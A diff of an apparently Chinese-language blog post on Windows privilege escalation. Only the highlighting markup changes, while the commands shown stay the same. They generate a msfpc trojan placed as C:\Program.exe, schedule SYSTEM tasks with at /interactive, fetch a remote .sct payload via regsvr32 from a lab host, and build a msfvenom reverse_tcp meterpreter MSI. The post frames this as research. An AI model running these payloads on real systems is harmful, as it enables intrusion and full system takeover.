@@ -173,8 +173,8 @@ Ping命令都不让用，限制很死。</p>
 <p>客观因素：由于<code>“C:\Program File(x86)”</code>普通用户（比User组权限还低的用户）也无法写入文件，所以本篇文章只是做研究范畴讨论，因为每个服务器的情况不同，安装的软件路径也不同，利用空间还是很大的。</p>
 <h3 id="提权过程-1">提权过程</h3>
 <p>生成木马：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">~# msfpc windows exe
-</code></pre></div><p>接下来的操作还是使用之前的木马，直接将木马命名为<code>“Program.exe”</code>放在<code>“C:\Program.exe”</code>，然后重启主机。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>~# msfpc windows exe
+</span></span></code></pre></div><p>接下来的操作还是使用之前的木马，直接将木马命名为<code>“Program.exe”</code>放在<code>“C:\Program.exe”</code>，然后重启主机。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2bd80f78-4f5f-11ec-a67c-00d861bf4abb.png" alt=""></p>
 <p>此时我们得到的会话已经时“SYSTEM”权限。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2c217500-4f5f-11ec-836e-00d861bf4abb.png" alt=""></p>
@@ -187,19 +187,19 @@ Ping命令都不让用，限制很死。</p>
 <p>例子：<code>at 10:45PM calc.exe</code></p>
 <p>该命令会发布一个定时任务计划，在每日的10:45启动calc.exe。</p>
 <p>我们可以通过 “/interactive”开启界面交互模式：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">at 10:45PM /interactive calc.exe
-</code></pre></div><p>验证是否以SYSTEM权限启动</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>at 10:45PM /interactive calc.exe
+</span></span></code></pre></div><p>验证是否以SYSTEM权限启动</p>
 <p>使用“at 10:56PM /interactive calc.exe”命令创建一个定时任务计划。</p>
 <p>参考文档：https://support.microsoft.com/zh-cn/help/313565/how-to-use-the-at-command-to-schedule-tasks</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2c79c872-4f5f-11ec-9243-00d861bf4abb.png" alt=""></p>
 <h3 id="提权过程-2">提权过程</h3>
 <p>可以采用Regsvr32一条命令上线，使用MSF的“multi/script/web_delivery”模块，我的配置如下：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2cba810a-4f5f-11ec-a375-00d861bf4abb.png" alt=""></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">regsvr32 /s /n /u /i:http://192.168.117.132:8080/EixyqoXL7Q8JccV.sct scrobj.dll
-</code></pre></div><p>就是需要执行的命令，需要将它加入定时任务计划中去。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>regsvr32 /s /n /u /i:http://192.168.117.132:8080/EixyqoXL7Q8JccV.sct scrobj.dll
+</span></span></code></pre></div><p>就是需要执行的命令，需要将它加入定时任务计划中去。</p>
 <p>命令：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">at 11:16PM <span style="color:#ae81ff">\i</span>nteractive regsvr32 /s /n /u /i:http://192.168.117.132:8080/EixyqoXL7Q8JccV.sct scrobj.dll
-</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2d010148-4f5f-11ec-a79d-00d861bf4abb.png" alt="">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>at 11:16PM <span style="color:#ae81ff">\i</span>nteractive regsvr32 /s /n /u /i:http://192.168.117.132:8080/EixyqoXL7Q8JccV.sct scrobj.dll
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2d010148-4f5f-11ec-a79d-00d861bf4abb.png" alt="">
 但是我发现regsvr32会报错。</p>
 <p>只能将木马落地到服务器（Win 2003 SP1）上了，还是采用之前生成的木马。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2d429ffe-4f5f-11ec-9d8f-00d861bf4abb.png" alt="">
@@ -223,8 +223,8 @@ Ping命令都不让用，限制很死。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2e038ef8-4f5f-11ec-825b-00d861bf4abb.png" alt=""></p>
 <h3 id="提权过程-3">提权过程</h3>
 <p>首先我们需要生成一个MSI木马：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.117.134 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f msi-nouac -o lask.msi
-</code></pre></div><p>开启一个监听：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.117.134 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f msi-nouac -o lask.msi
+</span></span></code></pre></div><p>开启一个监听：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2e448250-4f5f-11ec-b1cb-00d861bf4abb.png" alt="">
 将lask.msi复制到Windows中，运行后即可获得SYSTEM权限。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2e8e68ca-4f5f-11ec-856a-00d861bf4abb.png" alt="">
